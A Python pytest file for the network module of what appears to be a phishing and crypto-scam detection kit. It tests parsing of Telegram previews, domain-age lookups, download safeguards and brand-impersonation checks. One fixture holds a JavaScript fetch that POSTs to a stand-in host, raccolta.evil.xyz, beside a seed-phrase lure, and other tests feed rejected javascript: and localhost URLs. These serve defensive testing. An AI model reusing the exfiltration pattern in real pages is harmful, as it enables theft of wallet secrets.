import io
import json
import sys
import urllib.error
from datetime import date
from email.message import Message
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import rete  # noqa: E402

FIX = Path(__file__).resolve().parent / "fixture"


class Risposta:
    def __init__(self, dati: bytes, tipo="text/html; charset=utf-8"):
        self._b = io.BytesIO(dati)
        self.headers = Message()
        self.headers["Content-Type"] = tipo
        self.status = 200

    def read(self, n=-1):
        return self._b.read(n)

    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False


def finto(monkeypatch, risposte):
    """risposte: dict url -> Risposta | Exception"""
    chiamate = []

    def apri(url):
        chiamate.append(url)
        r = risposte.get(url)
        if r is None:
            raise urllib.error.HTTPError(url, 404, "Not Found", None, None)
        if isinstance(r, Exception):
            raise r
        return r
    monkeypatch.setattr(rete, "_apri", apri)
    return chiamate


def test_leggi_anteprima_ufficiale():
    r = rete.leggi_anteprima((FIX / "tme_ufficiale.html").read_text(encoding="utf-8"))
    assert r["titolo"] and r["descrizione"]
    assert r["verificato"] is True
    assert r["scam"] is False and r["fake"] is False


def test_leggi_anteprima_imitazione():
    r = rete.leggi_anteprima((FIX / "tme_imitazione.html").read_text(encoding="utf-8"))
    assert r["titolo_normalizzato"] == "METAMASK WALLET"
    assert r["caratteri_decorativi"] is True
    assert r["utenti_mensili"] == 12345
    assert r["verificato"] is False
    assert "funds" in r["descrizione"]


def test_leggi_anteprima_scam_sintetica():
    html = ('<div class="tgme_page_title"><span dir="auto">Bot</span>'
            '<span class="account_scam">SCAM</span></div>')
    r = rete.leggi_anteprima(html)
    assert r["scam"] is True


def test_leggi_rdap_giovane():
    dati = {"events": [{"eventAction": "registration", "eventDate": "2026-10-14T10:00:00Z"}],
            "entities": [{"roles": ["registrar"],
                          "vcardArray": ["vcard", [["fn", {}, "text", "Registrar Spa"]]]}]}
    r = rete.leggi_rdap(dati, date(2026, 11, 13))
    assert r["eta_giorni"] == 30 and r["giovane"] is True
    assert r["creato"] == "2026-10-14"
    assert r["registrar"] == "Registrar Spa"


def test_leggi_rdap_senza_eventi():
    r = rete.leggi_rdap({}, date(2026, 11, 13))
    assert r["creato"] is None and r["giovane"] is False


def test_scarica_rifiuta_schemi(tmp_path, monkeypatch):
    finto(monkeypatch, {})
    for u in ["file:///c:/x", "ftp://x.it/a", "javascript:alert(1)"]:
        assert rete.scarica(u, tmp_path, "a.html")["esito"] == "non_verificato"


def test_scarica_rifiuta_localhost(tmp_path, monkeypatch):
    chiamate = finto(monkeypatch, {})
    for u in ["http://127.0.0.1/", "http://localhost/", "http://192.168.1.1/", "http://[::1]/"]:
        assert rete.scarica(u, tmp_path, "a.html")["esito"] == "non_verificato"
    assert chiamate == []


def test_scarica_timeout(tmp_path, monkeypatch):
    finto(monkeypatch, {"https://lento.it/": TimeoutError("timed out")})
    r = rete.scarica("https://lento.it/", tmp_path, "a.html")
    assert r["esito"] == "non_verificato"


def test_scarica_404(tmp_path, monkeypatch):
    finto(monkeypatch, {})
    r = rete.scarica("https://esempio.it/manca", tmp_path, "a.html")
    assert r["esito"] == "non_verificato" and "404" in r["motivo"]


def test_scarica_tronca(tmp_path, monkeypatch):
    finto(monkeypatch, {"https://grande.it/": Risposta(b"x" * 3_000_000)})
    r = rete.scarica("https://grande.it/", tmp_path, "a.html")
    assert r["esito"] == "ok" and r["troncato"] is True and r["byte"] == 2_000_000
    assert (tmp_path / "a.html").stat().st_size == 2_000_000


def test_scarica_salvataggio_bloccato(tmp_path, monkeypatch):
    finto(monkeypatch, {"https://x.it/": Risposta(b"<html>ciao</html>")})
    monkeypatch.setattr(Path, "write_bytes", lambda self, d: (_ for _ in ()).throw(OSError(22, "x")))
    r = rete.scarica("https://x.it/", tmp_path, "a.html")
    assert r["esito"] == "ok" and r["salvato"] is False and r["dati"] == b"<html>ciao</html>"


def test_pagina_binaria(tmp_path, monkeypatch):
    finto(monkeypatch, {"https://x.it/f": Risposta(b"\x00\x01\x02" * 100, "application/octet-stream")})
    r = rete.analizza_pagina("https://x.it/f", tmp_path)
    assert r["contenuto_non_html"] is True and r["segnali"] == []


def test_analizza_pagina_script_e_invio(tmp_path, monkeypatch):
    html = (b'<script src="/a.js"></script><script src="https://cdn.altro.xyz/b.js"></script>'
            b"<input><p>seed phrase</p>")
    js = b"fetch('https://raccolta.evil.xyz/s',{method:'POST'})"
    finto(monkeypatch, {"https://app.esempio.xyz/": Risposta(html),
                        "https://app.esempio.xyz/a.js": Risposta(js, "application/javascript")})
    r = rete.analizza_pagina("https://app.esempio.xyz/", tmp_path)
    codici = {s["codice"] for s in r["segnali"]}
    assert {"pagina_seed_phrase", "pagina_script_esterni", "pagina_invio_dati_esterno"} <= codici
    assert r["script_esterni"] == ["cdn.altro.xyz"]


def test_dominio_estratto_da_url(monkeypatch):
    rdap = {"events": [{"eventAction": "registration", "eventDate": "2026-11-01T00:00:00Z"}]}
    chiamate = finto(monkeypatch, {
        "https://rdap.org/domain/metamasks-web.xyz": Risposta(json.dumps(rdap).encode(),
                                                             "application/rdap+json")})
    monkeypatch.setattr(rete.socket, "getaddrinfo", lambda *a, **k: [("x",)])
    r = rete.dominio("https://app.metamasks-web.xyz/path?x=1", date(2026, 11, 13))
    assert chiamate == ["https://rdap.org/domain/metamasks-web.xyz"]
    assert r["dominio"] == "metamasks-web.xyz" and r["giovane"] is True and r["risolve"] is True
    assert "metamask" in {i["marchio"] for i in r["contiene_marchio"]}


def test_dominio_rete_assente(monkeypatch):
    finto(monkeypatch, {"https://rdap.org/domain/esempio.it": OSError("rete assente")})

    def no_dns(*a, **k):
        raise OSError("dns")
    monkeypatch.setattr(rete.socket, "getaddrinfo", no_dns)
    r = rete.dominio("esempio.it", date(2026, 11, 13))
    assert r["esito"] == "non_verificato" and r["risolve"] is False


def test_dominio_registrabile():
    assert rete.dominio_registrabile("a.b.esempio.co.uk") == "esempio.co.uk"
    assert rete.dominio_registrabile("www.esempio.it") == "esempio.it"


# correzione D: una sola regola per il dominio base (stessi casi in tests/js/sicurezza.test.js)
CASI_DOMINIO_BASE = {
    "a.b.example.com": "example.com",
    "news.bbc.co.uk": "bbc.co.uk",
    "forum.example.co.uk": "example.co.uk",
    "www.example.com.br": "example.com.br",
    "foo.edu.au": "foo.edu.au",
    "corsi.foo.edu.au": "foo.edu.au",
    "localhost": "localhost",
    "192.168.1.10": "192.168.1.10",
    "::1": "::1",
    "[2001:db8::1]": "2001:db8::1",
    "Example.COM.": "example.com",
    "": "",
}


@pytest.mark.parametrize("host,atteso", list(CASI_DOMINIO_BASE.items()))
def test_d_dominio_registrabile_casi(host, atteso):
    assert rete.dominio_registrabile(host) == atteso


def test_d_una_sola_regola_python():
    """punteggio e resoconto non hanno più un loro calcolo del dominio base: usano rete."""
    import punteggio
    import resoconto
    assert not hasattr(punteggio, "_dominio_base") and not hasattr(resoconto, "_dominio_base")
    assert punteggio.dominio_registrabile is rete.dominio_registrabile
    assert resoconto.dominio_registrabile is rete.dominio_registrabile
    kit = Path(__file__).resolve().parents[1]
    definizioni = [p.name for p in kit.glob("*.py") if "SECONDO_LIVELLO = " in p.read_text(encoding="utf-8")]
    assert definizioni == ["rete.py"]


def test_a_tld_rischioso_nel_controllo_dominio(monkeypatch):
    _senza_rete(monkeypatch, "binance-airdrop-claim.xyz")
    assert rete.dominio("https://binance-airdrop-claim.xyz/app", date(2026, 11, 17))["tld_rischioso"] == "xyz"
    _senza_rete(monkeypatch, "esempio.it")
    assert rete.dominio("https://esempio.it", date(2026, 11, 17))["tld_rischioso"] is None


def test_a_tld_rischiosi_uguali_in_python_e_js():
    import re as re_mod
    kit = Path(__file__).resolve().parents[1]
    testo = (kit / "app" / "analizzatore.js").read_text(encoding="utf-8")
    js = set(re_mod.findall(r'"(\w+)"', re_mod.search(r"TLD_RISCHIOSI = \[(.*?)\]", testo).group(1)))
    assert js == rete.TLD_RISCHIOSI


def test_d_secondo_livello_uguale_in_python_e_js():
    import re as re_mod
    kit = Path(__file__).resolve().parents[1]
    testo = (kit / "app" / "sicurezza.js").read_text(encoding="utf-8")
    js = set(re_mod.findall(r'"(\w+)"', re_mod.search(r"SECONDO_LIVELLO = \[(.*?)\]", testo).group(1)))
    assert js == rete.SECONDO_LIVELLO and "edu" in js
    for f in ("motore.js", "analizzatore.js", "assembla.js"):
        assert "SECONDO_LIVELLO" not in (kit / "app" / f).read_text(encoding="utf-8"), f


# --- M2: marchio nei sottodomini, sito ufficiale escluso, IP mai inviati a RDAP ---

def _senza_rete(monkeypatch, dom):
    rdap = {"events": [{"eventAction": "registration", "eventDate": "2020-01-01T00:00:00Z"}]}
    finto(monkeypatch, {f"https://rdap.org/domain/{dom}": Risposta(json.dumps(rdap).encode(),
                                                                    "application/rdap+json")})
    monkeypatch.setattr(rete.socket, "getaddrinfo", lambda *a, **k: [("x",)])


def marchi_dominio(r):
    return {i["marchio"] for i in r["contiene_marchio"]}


def test_marchio_nel_sottodominio(monkeypatch):
    _senza_rete(monkeypatch, "sito-falso.xyz")
    r = rete.dominio("https://binance.sito-falso.xyz/login", date(2026, 11, 14))
    assert "binance" in marchi_dominio(r)
    _senza_rete(monkeypatch, "verifica.app")
    assert "metamask" in marchi_dominio(rete.dominio("https://secure-metamask.login.verifica.app", date(2026, 11, 14)))


def test_sito_ufficiale_e_suoi_sottodomini_senza_marchio(monkeypatch):
    for url, dom in (("https://www.binance.com", "binance.com"),
                     ("https://accounts.binance.com/it", "binance.com"),
                     ("https://wallet.binance.com", "binance.com")):
        _senza_rete(monkeypatch, dom)
        assert rete.dominio(url, date(2026, 11, 14))["contiene_marchio"] == [], url


def test_parola_generica_nel_sottodominio_non_conta(monkeypatch):
    _senza_rete(monkeypatch, "negozio.it")
    assert rete.dominio("https://wallet.negozio.it", date(2026, 11, 14))["contiene_marchio"] == []


def test_ip_non_inviato_a_rdap(monkeypatch):
    for url in ("http://185.23.10.4/app", "185.23.10.4", "https://[2001:db8::1]/x"):
        chiamate = finto(monkeypatch, {})
        monkeypatch.setattr(rete.socket, "getaddrinfo", lambda *a, **k: [("x",)])
        r = rete.dominio(url, date(2026, 11, 14))
        assert chiamate == [], url
        assert r["esito"] == "non_verificato" and r["ip_diretto"] is True, url
        assert r["contiene_marchio"] == []
